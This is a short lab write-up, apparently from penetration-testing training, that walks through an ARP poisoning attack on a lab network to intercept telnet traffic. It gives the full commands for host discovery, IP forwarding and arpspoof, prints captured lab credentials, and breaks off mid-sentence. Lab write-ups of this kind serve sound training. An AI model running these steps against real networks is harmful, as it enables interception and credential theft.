ARP Spoofing 
	 
	Description - In this lab, you are connected to a switched network. Try to intercept network traffic and steal telnet credentials by performing an ARP poisoning attack. 
	 
	To perform an ARP Attack, I need to forward the packets first 
	 
	Goal - Identify the telnet server and the client machine 
	 
	I run ip a s 
	IP Address = 10.100.13.140 
	 
	I then run going to find live hosts on the network 
	Command - fping -a -g 10.100.13.0/24 
	 
	We get the following alive hosts:- 
	10.100.13.36 
	10.100.13.37 
	10.100.13.140 
	 
	Running a Nmap scan to determine the OS Version, we find 
	 
	10.100.13.36 - No exact guess - Likely to be a Linux version > 3.0 
	10.100.13.37 - No exact guess - Likely to be Linux version 3.2 
	10.100.13.140 
	 
	From a port scan, we determined that the telnet port in question was available on 10.100.13.37, as port 23 was open 
	 
	So,we now proceed with the attack 
	Our target - 10.100.13.37 
	Other machine - 10.100.13.36 
	 
	First,forward the traffic 
	Command - echo 1 > /proc/sys/net/ipv4/ip_forward 
	 
	Now to open Wireshark, SET INTERFACE TO TAP0 (ON MAIN PAGE) and enter telnet in the search bar 
	 
	Now to commence the attack 
	Command - arpspoof -i tap0 -t 10.100.13.37 -r 10.100.13.36 
	 
	We have captured quite a few packets on Wireshark. Let's analyze them 
	 
	In one of the first packets we captured, we get - Image A1 (follow the TCP Stream) 
	------------------------------------------------------------------- 
	For curiosity, I tried to log in to telnet port of 10.100.13.37, using telnet 
	 
	Command - telnet 10.100.13.37 
	 
	Enter the username - elsuser 
	Enter the password - Mys3crtP455 
	 
	ls'ing,we get a README file 
	catting it,we get
